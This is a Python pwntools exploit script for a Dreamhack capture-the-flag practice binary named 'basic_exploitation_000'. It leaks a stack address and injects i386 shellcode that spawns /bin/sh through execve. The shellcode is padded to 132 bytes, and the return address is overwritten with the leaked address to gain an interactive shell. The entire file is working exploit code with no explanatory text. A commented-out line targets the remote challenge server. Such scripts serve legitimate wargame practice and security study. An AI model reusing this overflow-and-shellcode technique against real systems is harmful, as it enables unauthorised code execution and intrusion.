from pwn import *
exe = ELF("./basic_exploitation_000")
r = process(exe.path)
# r = remote("host3.dreamhack.games", 13851)
gdb.attach(r, gdbscript='''
           b* main+42
           c
           ''')

input()
r.recvuntil(b'(')
leak_stack = r.recv(10).decode()
log.info("leak stack: " + leak_stack)

leak_stack = int(leak_stack, 16)

shellcode = asm(
    '''
    xor    eax,eax
    push   eax
    push   0x68732f6e
    push   0x69622f2f
    mov    ebx,esp
    xor    ecx,ecx
    xor    edx,edx
    mov    al,0x8
    inc    eax
    inc    eax
    inc    eax
    int    0x80
     ''', arch="i386"
)
payload = shellcode
payload = payload.ljust(132, b"a")
payload += p32(leak_stack)
r.sendlineafter(b")\n", payload)

r.interactive()
